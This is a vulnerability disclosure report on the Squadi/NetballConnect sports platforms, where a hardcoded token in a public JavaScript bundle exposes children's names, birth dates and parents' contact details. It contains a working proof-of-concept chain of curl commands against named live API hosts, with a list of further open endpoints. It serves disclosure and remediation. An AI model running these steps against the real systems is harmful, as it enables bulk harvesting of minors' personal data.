# Security Vulnerability Report — Squadi / World Sport Action

**Date:** 23 February 2026 (updated 24 February 2026)
**Reporter:** Casey Toll
**Severity:** Critical — Children's PII exposure across multiple sports
**Status:** Undisclosed (responsible disclosure)

---

## Executive Summary

A hardcoded authentication token embedded in the publicly-accessible NetballConnect JavaScript bundle grants unauthenticated access to personal information of all registered players across all competitions in Australia. This includes **children's full names, dates of birth, parent email addresses, and phone numbers**.

The data is accessible to anyone with a web browser and basic technical knowledge. No account, login, or special tools are required. **A person with no technical training could extract this data in minutes using only a browser's built-in developer tools.**

The same token also grants access to player data on the Squadi basketball platform, indicating the exposure extends beyond netball to all sports managed by Squadi / World Sport Action.

**Conservative estimate: 300,000 – 500,000 children's records are exposed**, with parent contact details attached to each one. Historical records dating back to at least 2022 remain accessible.

---

## Affected Systems

- **Platform:** Squadi / World Sport Action (trading as NetballConnect, BasketballConnect, and others)
- **APIs confirmed affected:**
  - `api-netball.squadi.com` — All netball competitions nationally
  - `api-basketball.squadi.com` — All basketball competitions nationally
  - `api.squadi.com` — Football/soccer competitions (unified platform)
- **Scope:** All competitions, all organisations, all registered players across all three confirmed Squadi sports platforms
- **Web application:** `registration.netballconnect.com`

## How Easy Is This to Exploit?

This vulnerability requires **no hacking, no password cracking, and no special tools**. The steps are:

| Step | Difficulty | Time Required |
|------|-----------|---------------|
| Find team IDs | Trivial — public endpoint, no auth needed | Seconds |
| Get the auth token | Trivial — visible in the browser's page source (right-click → View Source) | Seconds |
| Get full rosters with PII | Trivial — one API call per team with the token from the source | Seconds per team |
| Bulk harvest all players nationally | Low — a simple script enumerating competitions and teams | Minutes to hours |

**A teenager with browser developer tools could access this data.** There is no rate limiting on any endpoint, meaning automated bulk extraction faces no barriers.

---

## Vulnerability Details

### 1. Hardcoded Authentication Token in Public JavaScript

The NetballConnect web application bundles a default API token directly into its publicly-served JavaScript file:

**File:** `https://registration.netballconnect.com/static/js/main.010fda61.js`

**Token location in source:** Search for `REACT_APP_DEFAULT_AUTH_TOKEN`

This token is loaded by every visitor's browser and can be extracted by viewing the page source or browser developer tools (Network tab). It is sent as the `Authorization` header on API requests.

### 2. Player PII Accessible via Team Roster Endpoint

Using the hardcoded token, the following API call returns full personal information for every player on a team:

```
GET https://api-netball.squadi.com/livescores/teams/id/{teamId}
Authorization: <hardcoded token from JS bundle>
```

**Response includes for each player:**
- `firstName`, `lastName` — Full name
- `dateOfBirth` — Date of birth (ISO format)
- `email` — Parent/guardian email address
- `phoneNumber` — Parent/guardian phone number
- `userId` — Internal user identifier
- `teamId` — Team assignment
- `competitionId` — Competition assignment

### 3. Team IDs Are Publicly Enumerable

Team IDs can be obtained without any authentication:

```
GET https://api-netball.squadi.com/livescores/teams?competitionId={id}&organisationId={orgId}
```

This returns all teams in a competition with their IDs, names, and division details. No token required.

### 4. Competition IDs Are Publicly Enumerable

Competition IDs are sequential integers. The following public endpoint returns competition details:

```
GET https://api-netball.squadi.com/livescores/competitions/id/{competitionId}
```

No authentication required. A simple scan from ID 1 upwards reveals every competition.

### 5. Cross-Platform Exposure

The same hardcoded token grants access to player PII on all three Squadi sports platforms:

**Basketball:**
```
GET https://api-basketball.squadi.com/livescores/teams/id/{teamId}
Authorization: <same hardcoded token>
```
Verified against comp 2000 ("2025/26 Club Maitland City Junior Summer Competition") — full player PII returned.

**Football/Soccer:**
```
GET https://api.squadi.com/livescores/teams/id/{teamId}
Authorization: <same hardcoded token>
```
Verified against comp 98 (Macarthur Football Association) — full player PII returned. Note this uses a different API host (`api.squadi.com` rather than `api-{sport}.squadi.com`), indicating it is a separate/newer deployment, yet the same token grants access.

---

## Attack Chain (Proof of Concept)

An attacker can extract all player PII nationally in four steps:

**Step 1 — Enumerate competitions:**
```bash
# Sequential IDs, no auth needed
curl https://api-netball.squadi.com/livescores/competitions/id/4650
# Returns: competition name, unique key, organisation details
```

**Step 2 — List all teams in a competition:**
```bash
# No auth needed
curl "https://api-netball.squadi.com/livescores/teams?competitionId=4650&organisationId=491"
# Returns: 100 teams with IDs, names, divisions
```

**Step 3 — Extract the hardcoded token:**
```bash
# View page source or JS bundle
curl https://registration.netballconnect.com/static/js/main.010fda61.js
# Search for: REACT_APP_DEFAULT_AUTH_TOKEN
```

**Step 4 — Get full roster with PII for any team:**
```bash
curl -H "Authorization: <token>" \
  "https://api-netball.squadi.com/livescores/teams/id/194366"
# Returns: every player's name, DOB, email, phone
```

**No rate limiting was observed on any endpoint.**

## Potential for Harm

The combination of data exposed enables several harmful scenarios:

- **Targeted contact of minors:** An attacker has children's full names, ages (from DOB), locations (from competition/venue data), and direct contact details for their parents.
- **Convincing phishing attacks:** "Hi [parent name], this is regarding [child name]'s registration for [competition name] at [venue]..." — every detail needed to craft a believable message is available through the API.
- **Bulk data harvesting:** With no rate limiting, a simple script could extract the entire national database of registered players in hours. There is no way to detect or prevent this with the current architecture.
- **Identity fraud:** Dates of birth combined with full names and parent details provide a foundation for identity-related fraud, particularly concerning for minors whose credit histories are typically unmonitored.

## How Long Has This Been Exposed?

Evidence from the Internet Archive (Wayback Machine) shows:

| Date | Evidence |
|------|----------|
| **28 Nov 2023** | Earliest archived snapshot of `registration.netballconnect.com` |
| **18 Dec 2023** | Earliest archived JS bundle — **already contains the same hardcoded token** |
| **Feb 2026** | Current JS bundle — **same token, unchanged after 2+ years** |

- The token has been present in **every archived JS bundle version** (26 different builds) across the full 2+ year archive history
- The token has **never been rotated** — the same value appears in Dec 2023 as in Feb 2026
- Player data from competitions labelled "2022" remains accessible, meaning records span **at least 4 years**
- The platform (World Sport Action / Squadi) may predate the NetballConnect branding, extending the exposure window further

**The absence of any token rotation in 2+ years suggests there is no monitoring for unauthorised API access and no token management policy.**

## Verified Impact — Nillumbik Force Netball Association

As a proof of concept, I queried the 10 Hazel Glen Netball Club teams registered in the 2026 NFNA Saturday Autumn competition (competitionId 4650):

| Team | Players Exposed |
|------|----------------|
| HG 11 Fever | 9 |
| HG 11 Fire | 9 |
| HG 11 Flames | 9 |
| HG 13 Embers | 9 |
| HG 13 Fever | 8 |
| HG 13 Fury | 9 |
| HG 13 Scorchers | 9 |
| HG 15 Embers | 9 |
| HG 15 Fever | 9 |
| HG 15 Flames | 10 |

**Total: 90 players' PII from one club alone.** The NF competition has 100 teams total (~900 players). The same method works for any competition ID on the platform.

**Confirmed exposed data for a specific player (my daughter, verified with parental consent):**
- Full name, date of birth (minor — age 13), parent email, parent phone number

---

## Scale Estimate

| Data Point | Value |
|-----------|-------|
| Netball player IDs in database | ~1,270,000+ (based on sequential ID enumeration) |
| Basketball player IDs | Additional (separate database, same token) |
| Football/soccer player IDs | Additional (separate database on `api.squadi.com`, same token) |
| Competition IDs (netball) | 4,750+ competitions spanning 2022–2026 |
| Competition IDs (basketball) | 2,000+ competitions |
| Competition IDs (football/soccer) | 100+ competitions |
| Estimated children's records exposed (netball) | 300,000 – 500,000 |
| Total records including adults and all sports | Potentially 1,000,000+ |
| User profile IDs (`/users/public/userProfile`) | ~16,000,000 sequential IDs returning names |

Note: Many players re-register each season, so unique individuals may be lower than total records. However, historical records (including old email/phone numbers) remain accessible and may still be sensitive.

## Additional Public Endpoints of Concern

These endpoints require no authentication and expose additional data:

| Endpoint | Data Exposed |
|----------|-------------|
| `/livescores/competitions/id/{id}` | Competition name, org, venue address, GPS coordinates, phone |
| `/livescores/teams?competitionId={id}` | All teams, division structure, team IDs |
| `/livescores/teams/ladder/v2?divisionId={id}&competitionKey={key}` | Full ladder standings |
| `/livescores/round/matches?competitionKey={key}&divisionId={id}` | Match schedules, scores, venues |
| `/livescores/matches/periodScores?matchId={id}` | Quarter scores, scorer/manager user IDs |
| `/users/public/userProfile?userId={id}` | First name, last name (~16M sequential IDs, no rate limit) |
| `/matches/public/gameSummary?matchId={id}` | Match details with official names |
| `/stats/public/v2/scoringByPlayer` | Player scoring statistics (where enabled) |

## Australian Privacy Law Implications

This exposure likely triggers obligations under Australian privacy legislation:

- **Privacy Act 1988:** Organisations handling personal information must take reasonable steps to protect it from misuse, interference, loss, and unauthorised access. A hardcoded token in public JavaScript does not meet this standard.
- **Australian Privacy Principles (APPs):** APP 11 requires reasonable security measures for personal information. APP 6 restricts use and disclosure. The open API effectively discloses all collected data to anyone.
- **Notifiable Data Breaches (NDB) scheme:** Organisations must notify the OAIC and affected individuals when a data breach is likely to result in serious harm. Children's PII (including DOB and parent contact details) being openly accessible for 2+ years likely meets this threshold.
- **Children's data:** The Privacy Act and the Children's Online Privacy guidelines impose heightened obligations when handling minors' personal information.
- **Shared responsibility:** Both Squadi (as data processor/platform provider) and the sporting organisations (as data controllers who collected the information via the platform) may have obligations.

**The 30-day assessment period under the NDB scheme begins when the entity becomes aware of the breach.**

## Recommended Remediation

### Immediate (within 24–48 hours)
1. **Remove the hardcoded token** from the JavaScript bundle. Use proper authentication (OAuth/session tokens) that requires user login.
2. **Restrict the `/livescores/teams/id/` endpoint** to require authenticated, authorised access (e.g., only team managers/coaches can see their own team's PII).
3. **Strip PII from public-facing responses** — team listings and rosters should not include email, phone, or DOB unless the requester has a legitimate need and proper authorization.

### Short-term (within 1–2 weeks)
4. **Audit all endpoints** returning PII (email, phone, DOB) across all sport platforms and ensure they require proper authorisation.
5. **Implement rate limiting** on all API endpoints to prevent bulk enumeration.
6. **Review server access logs** for any historical bulk access patterns that may indicate prior data harvesting.
7. **Assess NDB notification obligations** — if the breach meets the serious harm threshold, notify the OAIC and affected individuals within the required timeframe.

### Medium-term (within 1–3 months)
8. **Review the `/users/public/userProfile` endpoint** which exposes names for ~16 million sequential user IDs with no rate limiting.
9. **Rotate all API tokens** after removing the hardcoded one, as the current token has been publicly cached (including in the Internet Archive) for 2+ years.
10. **Implement proper API authorization architecture** — separate public data (ladders, scores, schedules) from sensitive data (player PII) with different access controls.
11. **Conduct a full security audit** of the platform, including all sport-specific APIs.
